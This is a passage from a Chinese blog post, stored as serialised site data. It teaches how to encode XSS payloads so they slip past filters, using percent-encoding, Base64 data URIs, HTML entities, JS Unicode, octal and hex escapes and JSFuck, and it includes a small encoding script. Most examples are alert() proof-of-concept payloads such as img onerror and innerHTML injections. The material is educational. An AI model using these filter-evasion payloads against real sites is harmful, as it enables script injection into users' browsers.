[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</div></pre></td></tr></table></figure></p>\n<p>我们在 Chrome 的控制台中输入：<br><img src=\"/Image/jsfuck_chrome.png\" alt=\"jsfunck_chrome\"></p>\n<p>如果想详细了解浏览器、解释器之间到底是怎么配合的，可以看看这篇文章学习一下。<br><a href=\"http://taligarsiel.com/Projects/howbrowserswork1.htm\" target=\"_blank\" rel=\"external\">How browsers work - Behind the scenes of modern web browsers</a></p>\n<p>现在再来看看开头提到的混合编码：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:ShowSomething('&amp;#37&amp;#53&amp;#99&amp;#37&amp;#55&amp;#56&amp;#37&amp;#51&amp;#52&amp;#37&amp;#51&amp;#49');\"</span>&gt;</span>click<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ShowSomething</span>(<span class=\"params\">x</span>)</span>&#123;</div><div class=\"line\">        alert(x);</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>页面加载时，会把 a 标签中的 HTML 实体编码做解码。<br>当点击「click」时，先把 href 的内容当作整体做 URL 解码。<br>最后因为 javascript 伪协议，把其中的 8进制转义字符做解码。<br>至于每一步，由什么转成什么，就不用我说了吧：）</p>\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h3><p>本篇的目的在于科普基础的编码，为了让非科班出身的朋友看起来不那么晦涩，理论知识介绍较少。<br>但这不代表理论知识不重要，我的初衷是希望大家能把我的例子拿出来修修改改，尝试不同的可能。在摸索中遇到疑惑，然后自己解决困惑，渐渐积累起一定的概念后，会有想知道原理的冲动。相信这个时候，你积累的东西已经能让你阅读通顺了。<br>写这篇文章的过程中，自己也查阅了很多的文章与维基百科，写了大量的测试代码来验证想法和探究原理，与老司机交流解惑。但最后只把其中比较直观的拿出来当作例子。后面再写写一些我了解到的姿势和一些需要搞清楚的原理性知识点也说不定（上面的那篇 How browsers work 中有此类知识点）。<br>不过到时候你可能已经比我强了，记得带带我：）</p>\n","site":{"data":{}},"excerpt":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=786262&auto=0&height=66\"></iframe>\n\n<blockquote>\n<p>记得那天，Windows xp 桌面上的天很蓝。<br>这是第几次远远的望着已经记不清了，走上前试试看吧。<br>我表现的不是很熟络，交谈的过程却出奇的愉快，好感度的 Level 似乎在不经意间也升了几级。<br>伴随着逐渐深入的交流，难免会擦出些共鸣的火花。<br>我是个对待这种事情比较认真的人。<br>","more":"了解的时候，走走心就好了。<br>真到了认定了的时候，再走……走四方，路迢……<br><br>可能那一天来的快了些，仓促间暴露出了还没准备好的胆怯。<br>不知道有没有被看到，不过想想也却是没什么丢人的。<br>说来也不怕笑话，平时会刻意让自己多留意一些有关体位的姿势。<br>在得到“请开始你的表演”的暗示时，脑海中的各种体位交错在一起，心还不争气的砰砰跳个不停。<br>这短暂的瞬间突然很慌张，毕竟没有实际操作的经验，这些体位有没有效果我心里也没底。<br><br>我动起来的那一刻，我完全不知道下一秒会得到什么样的反应。<br>毕竟是个没有经验的年轻人，当发现没有回应的时候，内心那个轻声呢喃的质疑声现在都还记得。<br>有点慌张，还有些不知所措。<br>不知从哪里涌出来的不甘让我顾不及反应如何就把脑中的体位一个接一个的用了出来。<br>渐渐的有了回应，因某些姿势恰到好处弹出回应的 body 给了我一些信心。<br>可有时任凭我姿势如何，那依然沉寂的如没有音乐的骨灰盒的 body，却成了挥不去的阴影。<br><br>那天事后，我点了支烟。<br>脑海中回忆着前一刻自己操作的慌张，眼神透过迷蒙的烟雾望着前方。<br>我想通了一件事情。<br>XSS 这样各种编码瞎特么插，迟早药丸。</p>\n</blockquote>\n<hr>\n<p>前几天有人看了我前面的博客后问我「什么样的情况下使用什么编码方式?」<br>当时我就扇了自己一嘴巴子，确实心路历程描述的不够饱满……</p>\n<h3 id=\"正文之前\"><a href=\"#正文之前\" class=\"headerlink\" title=\"正文之前\"></a>正文之前</h3><p>编码这件事如果瞎j8操作那真是犹如「加藤老师扣人嘴」，还是写一写吧。便有了这篇。</p>\n<p>其实该使用什么编码插入，要根据实际情况而定，单一的编码，混合编码都有可能。重要的是清楚<strong>哪种编码</strong>在<strong>哪个时刻</strong>被<strong>哪种规则</strong>解析。 </p>\n<p>简单点来说就是：URL 请求时会对百分号等 URL 的编码方式进行转码；浏览器接收到页面数据后，会对 HTML 实体编码进行转码；执行 JS 时会对 JSUnicode 等 JS 支持的方式进行转码。</p>\n<p>复合编码的情况稍微复杂了些，比如这样：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:ShowSomething('&amp;#37&amp;#53&amp;#99&amp;#37&amp;#55&amp;#56&amp;#37&amp;#51&amp;#52&amp;#37&amp;#51&amp;#49');\"</span>&gt;</span>click<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ShowSomething</span>(<span class=\"params\">x</span>)</span>&#123;</div><div class=\"line\">        alert(x);</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这个例子中，从浏览器开始加载页面到你点击「click」弹出内容，<code>ShowSomething()</code> 的参数经过了三次转码。</p>\n<p>如果看不懂上面的例子没关系，等看完这篇文章，你还是看不懂上面的例子，再跳楼也不迟：）</p>\n<p>好进入正题前先说明（anli）一下：<br>下文中不会刻意说明某些字符转码前后分别是什么，大家请自行对照。<br>如果有转码需求，可以使用 Cos 他们这个开源工具 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」 自行转码。  </p>\n<p>另外，本篇会面向基础薄弱的读者。会写的相对浅显，例如不会提及 <code>DOM</code> 、 <code>JS 解释器</code> 等这类需要一定知识积累的概念。老司机可以下车了～</p>\n<h3 id=\"URL-编码\"><a href=\"#URL-编码\" class=\"headerlink\" title=\"URL 编码\"></a>URL 编码</h3><p>这里要说的 URL 编码指的是 <strong>URI 的百分号编码</strong>。<br>我们在进行 URL 请求时，浏览器会自动帮我们把部分符号转换成 <code>&#39;%&#39; + &#39;十六进制数字&#39;</code> 的形式，用 windows 时间长的朋友们可能会遇见自己的安装软件时显示的路径中有一些<code>字符</code>或者<code>中文</code>会被显示为这种形式。   </p>\n<p>服务器接收到提交来的请求时，会先把 <code>%</code> 编码转换成正常的字符。<br>我们借助一个简单的 php web 应用来说明这个问题，代码很简单：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt; <span class=\"attr\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">' \"URL 请 求：\" + location.search.substr(1) +</span></span></div><div class=\"line\">                \"\\n\" + </div><div class=\"line\">                \"服务器接受：\" + \"&lt;?php echo '<span class=\"attr\">para</span>=<span class=\"string\">'.$_GET['</span><span class=\"attr\">para</span>']?&gt;\"</div><div class=\"line\">            );'</div><div class=\"line\">    &gt;click<span class=\"tag\">&lt;/ <span class=\"attr\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>上面这段代码可以自己放到自己的服务器上试一下。<br>当我们带着这样的参数请求时：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xxx.com/xxx.php?para=%3Cscript%3E%61lert();%3C/script%3E</div></pre></td></tr></table></figure></p>\n<p><img src=\"/Image/url_encode.png\" alt=\"url_encode\"></p>\n<p>从 <code>alert()</code> 的内容和 Chrome 的控制台都能看出我们的「百分号编码」被转义为正常内容了。<br>其中 <code>alert()</code> 中的 <code>a</code> 被我转成了 <code>%61</code>，想说明除了符号，数字和字母也是可以做转换的。</p>\n<p>URL 这里其实还有一种 <strong>Base64</strong> 编码, 常用来做简单加密传输数据。<br>比如我们在 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」 中使用 「Base64EN」转换下面的代码<br><code>&lt;script&gt;alert(/xss/);&lt;/script&gt;</code> 得到： <code>PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+</code><br>我们可以这样试试效果：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+\"</span>&gt;</span>XSS<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>点击链接后，就会通过 data 协议去加载后面的内容。其中，如果声明了 Base64 的话，就会做相应的 Base64 解码操作。对了，这个例子在 Chrome 里会被拦截，点击没反应的话，按 F12 你会看到红色的警告，控制台里点击一下链接就看到效果了。<br>其实还有……这里就不讲了。想拓展的可以去 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」看看上面都有什么，这也是一种学习方式：）。</p>\n<h3 id=\"HTML-实体编码\"><a href=\"#HTML-实体编码\" class=\"headerlink\" title=\"HTML 实体编码\"></a>HTML 实体编码</h3><p>有些时候，我们想在页面上显示的东西会跟 HTML 本身的标记冲突。<br>比如我们只想在页面中显示 <code>&lt;script&gt;alert();&lt;/script&gt;</code> 而不是执行这串代码的时候，我们如下这样写是不行的：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert();</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>其中的 <code>&lt;script&gt;alert();&lt;/script&gt;</code> 会被当作 JS 脚本进行解析。<br>但如果我们把这些字符用另一种方式表示，只要不出现类似 <code>&lt;script&gt;</code> 这种内容的话，问题似乎就解决了。<br>HTML 编码就是用来解决这件事情的，我们的 ‘&lt;’ 字符可以用 HTML编码中的 <code>&amp;lt;</code> 来表示。<br>那我们的代码可以变成：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    &amp;lt;scirpt&gt;alert();&amp;lt;/script&gt;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>上面的代码可以自己拷贝出来，保存到文本文件，起名 xxx.html 然后用浏览器打开试试看。<br>上面用到的是 <code>&#39;&amp;&#39; + &#39;约定名称&#39; + &#39;;&#39;</code> 的形式，其实还有 <code>&#39;&amp;#&#39; + &#39;十进制数字&#39; + &#39;;&#39;</code> 和 <code>&#39;&amp;#x&#39; + &#39;十六进制数字&#39; + &#39;;&#39;</code> 的形式。比如上文的 <code>&#39;&lt;&#39;</code> 这个字符可以表示为 <code>&amp;#0060;</code> 和 <code>&amp;#x003c;</code>。<br>其中约定名称是为了便于记忆，后面的十进制和十六进制编码中 <code>#</code> 后面的连续的零多几个或者少几个都可以，类似<code>1</code>和<code>00001</code>的数值是相等的感觉。  </p>\n<p>我们都知道这样是可以触发弹窗的（不知道的话，要自行补一补哦）：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert();'</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>我们还可以应用 HTML 实体编码这样：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'&amp;#97;lert&amp;#40;&amp;#41;&amp;#59'</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>但有个要求：HTML 实体编码不能干扰到标签自身的属性和声明性内容。<br>比如：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">im&amp;#103;</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert();'</span>/&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">sr</span>&amp;#<span class=\"attr\">99</span>;=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert();'</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>都是不行的。</p>\n<p>关于 HTML 实体编码，十进制与十六进制编码后面的 ‘;’ 是可以省略的。</p>\n<h3 id=\"JS-编码\"><a href=\"#JS-编码\" class=\"headerlink\" title=\"JS 编码\"></a>JS 编码</h3><p>到这里，可能大家面对各种编码已经比较淡定了，不就是不同的编码规则嘛。<br>首先说说 JS Unicode 编码<br>规则是 <code>&#39;\\u&#39; + &#39;四位十六进制数字&#39;</code> 不够四位前面补0。<br>我们来看看例子（通过 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」转码）：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"comment\">//进行 JS Unicode 转码前的样子：</span></div><div class=\"line\">    <span class=\"comment\">//document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\";</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.body.innerHTML=<span class=\"string\">\"\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0027\\u0027\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u002f\\u0078\\u0073\\u0073\\u002f\\u0029\\u0027\\u002f\\u003e\"</span>;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这段代码在执行 innerHTML 操作前，因为字符串符合 Unicode 编码规则，会被先解码再输出。<br>另外，也可以这样玩：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    \\u0061lert(<span class=\"regexp\">/xss/</span>);</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>好，下面说说 「8进制」和「16进制」的转义字符。<br>「8进制」由 <code>&#39;\\&#39; + &#39;8进制数字&#39;</code> 组成。<br>「16进制」由 <code>&#39;\\x&#39; + &#39;16进制数字&#39;</code> 组成。  </p>\n<p>我们来看看例子。  额……嗯……<br>「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」上并没有直接提供这两种转码功能……  在网上简单搜索了一下，没找到什么合适的。<br>「卧槽，没有地方能转怎么办？」『<strong>自己写啊</strong>』  </p>\n<h4 id=\"自己写一个「定制版转换工具」\"><a href=\"#自己写一个「定制版转换工具」\" class=\"headerlink\" title=\"自己写一个「定制版转换工具」\"></a>自己写一个「定制版转换工具」</h4><p>其实自己写的难度不大，为什么这么说？因为 「<a href=\"http://xssor.io/\" target=\"_blank\" rel=\"external\">xssor.io</a>」 已经实现了 10进制 与 16进制 的 encode、decode功能。<br>嗯，我们去「借鉴一下」。</p>\n<p>通过项目的页面代码，我们能能够找到我们需要的代码所在位置：<br><img src=\"/Image/xssor_github_ende.png\" alt=\"xssor_github_ende\"></p>\n<p>在页面的文件中找到对应方法，看具体实现：<br><img src=\"/Image/xssor_github_ende_function.png\" alt=\"xssor_github_ende_function\"></p>\n<p>作为一个老司机，最重要的还是「心中无码」，我们只要看它的实现思想就好。<br>核心思想是通过 <code>charCodeAt()</code> 把我们输入的内容转成 Unicode 编码的数字，然后使用 <code>toString(x)</code> 再转成对应 x 进制的数字，然后定制我们的样式。<br>下面来根据我们的需求，定制我们自己的代码：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;html&gt;</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">&lt;script&gt;</div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">xss_js_to8or16</span>(<span class=\"params\">x, txt</span>)</span>&#123;</div><div class=\"line\">        <span class=\"keyword\">var</span> _a=<span class=\"string\">\"\"</span>;</div><div class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;txt.length; i++)&#123;</div><div class=\"line\">            <span class=\"comment\">// 这里用到了三目运算符。如果不知道自行充能哦。</span></div><div class=\"line\">            s = txt.charCodeAt(i).toString(x == <span class=\"number\">8</span> ? <span class=\"number\">8</span> : <span class=\"number\">16</span>);</div><div class=\"line\">            <span class=\"comment\">// '\\\\' 转义后变为 '\\'   </span></div><div class=\"line\">            _a += (x == <span class=\"number\">8</span> ? <span class=\"string\">\"\\\\\"</span> : <span class=\"string\">\"\\\\x\"</span>) + s;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">return</span> _a;</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">var</span> str = <span class=\"string\">\"&lt;img src='' onerror='alert(/xss/)'/&gt;\"</span>;</div><div class=\"line\">    <span class=\"built_in\">console</span>.log(xss_js_to8or16(<span class=\"number\">8</span>, str));</div><div class=\"line\">    <span class=\"built_in\">console</span>.log(xss_js_to8or16(<span class=\"number\">16</span>, str));</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div><div class=\"line\">&lt;<span class=\"regexp\">/html&gt;</span></div></pre></td></tr></table></figure></p>\n<p>好了，我们把代码保存为 <code>xx.html</code> ，并通过浏览器打开，F12 下看 Console 标签内的内容，就是我们想要的 8进制 与 16进制的内容了。</p>\n<p>把拿到的字符串放入我们的例子中，8进制：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"comment\">//进行 JS Unicode 转码前的样子：</span></div><div class=\"line\">    <span class=\"comment\">//document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\";</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.body.innerHTML=<span class=\"string\">\"\\74\\151\\155\\147\\40\\163\\162\\143\\75\\47\\47\\40\\157\\156\\145\\162\\162\\157\\162\\75\\47\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51\\47\\57\\76\"</span>;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>16进制：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span 